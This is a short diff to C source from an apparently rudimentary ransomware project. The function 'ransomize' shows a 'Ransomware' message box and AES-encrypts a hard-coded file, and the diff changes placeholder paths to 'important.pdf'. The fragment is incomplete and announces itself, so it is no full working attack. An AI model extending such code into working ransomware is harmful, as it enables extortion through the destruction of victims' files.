@@ -7,8 +7,8 @@
 void ransomize(void)
 {
     // TODO: target files
-    const char *input_file = "your_path.pdf";
-    const char *output_file = "your_path.enc";
+    const char *input_file = "important.pdf";
+    const char *output_file = "important.enc";
 
     MessageBoxA(NULL, "Encrypting file", "Ransomware", MB_OK);
     encypt_file_aes(input_file, output_file);
